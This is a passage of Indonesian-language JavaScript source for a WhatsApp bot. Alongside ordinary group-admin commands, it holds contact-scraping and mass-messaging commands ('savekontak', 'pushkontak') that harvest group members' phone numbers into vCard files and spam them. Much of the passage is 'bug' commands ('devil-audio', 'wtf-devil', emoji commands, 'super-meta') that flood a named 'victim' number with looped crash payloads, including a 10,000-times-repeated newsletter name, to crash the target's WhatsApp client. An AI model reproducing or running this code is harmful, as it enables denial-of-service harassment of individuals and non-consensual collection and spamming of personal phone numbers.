				respon = `Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}\n\n\n${cpus[0] ? `_Total CPU Usage_\n${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}\n_CPU Core(s) Usage (${cpus.length} Core CPU)_\n${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}`.trim()
				reply(respon)
			}
			break
case "kik": case "kick": {
if (!isGroup) return reply(msg.group)
if (!isBotAdmin) return reply(msg.adminbot)
if (!isAdmin && !isOwner) return reply(msg.admin)
if (text || m.quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await anggazyy.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => anggazyy.sendMessage(m.chat, {text: `Berhasil Mengeluarkan @${users.split("@")[0]} Dari Grup Ini`, mentions: [`${users}`]}, {quoted: m})).catch((err) => reply(err.toString()))
} else return reply(example('nomornya/@tag'))}
break
case "hidetag": case "z": case "h": {
if (!isGroup) return reply(msg.group)
if (!isAdmin && !isOwner) return reply(msg.admin)
if (!m.quoted && !text) return reply(example("teksnya/replyteks"))
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
anggazyy.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case "tagall": case "tag": {
if (!isGroup) return reply(msg.group)
if (!isAdmin && !isOwner) return reply(msg.admin)
if (!text) return reply(example("Pesannya"))
var member = await groupMetadata.participants.map(e => e.id)
var teks = ` ${text}\n\n`
member.forEach(e => e !== m.sender ? teks += `@${e.split("@")[0]}\n` : '')
anggazyy.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case "savekontak": {
if (!isOwner) return reply(msg.owner)
if (!isGroup) return reply(msg.group)
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.1",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
reply(err.toString())
} finally {
if (m.chat !== m.sender) await reply(`File Kontak Berhasil Dikirim ke Private Chat\n*Total ${halls.length} Kontak*`)
await anggazyy.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File Contact Berhasil Di Buat ✅\n*
*Total ${halls.length} Kontak*`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "savekontak2": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("idgrupnya\n\nketik *.listgc* untuk melihat semua list id grup"))
var idnya = text
var groupMetadataa
try {
groupMetadataa = await anggazyy.groupMetadata(`${idnya}`)
} catch (e) {
return reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.1",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
reply(err.toString())
} finally {
if (m.chat !== m.sender) await reply(`File Kontak Berhasil Dikirim ke Private Chat\n*Total ${halls.length} Kontak*`)
await anggazyy.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File Kontak Berhasil Di Buat ✅\nTotal ${halls.length} Kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "pushkontak": {
if (!isOwner) return reply(msg.owner)
if (!isGroup) return reply(msg.group)
if (!text) return reply(example("pesannya"))
var teks = text
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let time = ms(delaypushkontak * Number(halls.length))
await reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
await anggazyy.sendMessage(mem, {text: teks}, {quoted: qchanel})
await sleep(global.delaypushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.1",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
reply(err.toString())
} finally {
if (m.chat !== m.sender) await reply(`File Kontak Berhasil Dikirim ke Private Chat\n*Total ${halls.length} Kontak*`)
await anggazyy.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File Kontak Berhasil Di Buat ✅\nTotal ${halls.length} Kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "pushkontak1": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
if (!text.split("|")) return reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
var [idnya, teks] = text.split("|")
var groupMetadataa
try {
groupMetadataa = await anggazyy.groupMetadata(`${idnya}`)
} catch (e) {
return reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let time = ms(delaypushkontak * Number(halls.length))
await reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
await anggazyy.sendMessage(mem, {text: teks}, {quoted: qchanel})
await sleep(global.delaypushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.1",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
reply(err.toString())
} finally {
if (m.chat !== m.sender) await reply(`File Kontak Berhasil Dikirim ke Private Chat\n*Total ${halls.length} Kontak*`)
await anggazyy.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File Kontak Berhasil Di Buat ✅\nTotal ${halls.length} Kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case 'devil-audio': {
if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxxxxxxxx|5`)
victim = text.split("|")[0]
amount = text.split("|")[1]
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
anggazyyganteng = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/sound2.mp3`)
for (let i = 0; i < amount; i++) {
anggazyy.sendMessage(target, { "caption": `anggazyy Official`, audio: anggazyyganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `anggazyyOfficial`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
await sleep(1500)
}
reply(`</> Success Sending ${command} to number ${target}`)
}
break

case 'devil-params':
if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx|5`)
victim = text.split("|")[0]
amount = text.split("|")[1]
XeonOP = global.virtexpc
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < amount; i++) {
menuu = `⚡ MENYALA DEVIL ANGGAZYY ⚡`
// button text
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson':""
                 },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "",
      url: "https://www.youtube.com/@anggazyymods",
      merchant_url: "https://www.youtube.com/@anggazyymods"
   })
}
]
ewe = `${menuu}`
anggazyy.sendButton(target,  hohe, m, {
body: ewe,
footer: XeonOP
})
}
reply(`*</> Succes abangkuu, menyala devil ⚡⚡⚡😍*`)
break

case "pushkontak2": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
if (!text.split("|")) return reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var idnya = text.split("|")[0]
var delay = Number(text.split("|")[1])
var teks = text.split("|")[2]
if (!idnya.endsWith("@g.us")) return reply("Format ID Grup Tidak Valid")
if (isNaN(delay)) return reply("Format Delay Tidak Valid")
if (!teks) return reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var groupMetadataa
try {
groupMetadataa = await anggazyy.groupMetadata(`${idnya}`)
} catch (e) {
return reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let time = ms(delay * Number(halls.length))
await reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
await anggazyy.sendMessage(mem, {text: teks}, {quoted: qchanel})
await sleep(Number(delay))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.1",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
reply(err.toString())
} finally {
if (m.chat !== m.sender) await reply(`File Kontak Berhasil Dikirim ke Private Chat\n*Total ${halls.length} Kontak*`)
await anggazyy.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File Kontak Berhasil Di Buat ✅\nTotal ${halls.length} Kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "pushkontak3": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
if (!text.split("|")) return reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
var idnya = text.split("|")[0]
var teks = text.split("|")[1]
var groupMetadataa
try {
groupMetadataa = await anggazyy.groupMetadata(`${idnya}`)
} catch (e) {
return reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
reply(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
let msgii = generateWAMessageFromContent(mem, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"KLICK INI BUAT SAVE WA KU\",\"url\":\"https://wa.me//6289601071334\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qloc2}) 
await anggazyy.relayMessage(mem,msgii.message, { 
messageId: msgii.key.id 
})
await sleep(8500)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.1",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
reply(err.toString())
} finally {
if (m.chat !== m.sender) await reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await anggazyy.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "idgc": {
if (!isOwner) return reply(msg.owner)
if (!isGroup) return reply(msg.group)
reply(`${m.chat}`)
}
break
// CASE BUG BY ANGGAZYY NO RENAME
case "wtf-devil": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break

case '💩': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case '👽': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case '🐕': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break

case 'super-meta': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 1; j++) {
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
 await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
